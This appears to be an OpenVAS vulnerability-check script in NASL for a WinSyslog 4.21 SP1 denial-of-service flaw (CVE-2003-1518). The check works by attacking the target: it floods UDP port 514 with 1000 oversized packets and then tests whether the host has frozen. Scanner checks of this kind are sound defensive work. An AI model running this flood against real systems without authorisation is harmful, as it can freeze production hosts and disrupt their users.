if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11884" );
	script_version( "2019-10-29T09:45:45+0000" );
	script_tag( name: "last_modification", value: "2019-10-29 09:45:45 +0000 (Tue, 29 Oct 2019)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:C" );
	script_cve_id( "CVE-2003-1518" );
	script_bugtraq_id( 8821 );
	script_name( "WinSyslog (DoS)" );
	script_category( ACT_DENIAL );
	script_copyright( "This script is Copyright (C) 2003 Matthew North" );
	script_family( "Denial of Service" );
	script_dependencies( "os_detection.sc" );
	script_require_udp_ports( 514 );
	script_mandatory_keys( "Host/runs_windows" );
	script_tag( name: "affected", value: "WinSyslog Version 4.21 SP1." );
	script_tag( name: "solution", value: "Contact the vendor for an update." );
	script_tag( name: "summary", value: "A vulnerability in WinSyslog allows remote attackers
  to cause the WinSyslog to freeze, which in turn will also freeze the operating system
  on which the product executes." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_probe" );
	exit( 0 );
}
require("host_details.inc.sc");
start_denial();
sleep( 1 );
up = end_denial();
if(!up){
	exit( 0 );
}
port = 514;
if(!get_udp_port_state( port )){
	exit( 0 );
}
soc = open_sock_udp( port );
if(!soc){
	exit( 0 );
}
start_denial();
for(i = 0;i < 1000;i++){
	num = ( 600 + i ) * 4;
	bufc = NASLString( crap( num ) );
	buf = NASLString( "<00>", bufc );
	send( socket: soc, data: buf );
}
close( soc );
sleep( 5 );
alive = end_denial();
if(!alive){
	security_message( port: port, proto: "udp" );
	exit( 0 );
}
exit( 99 );

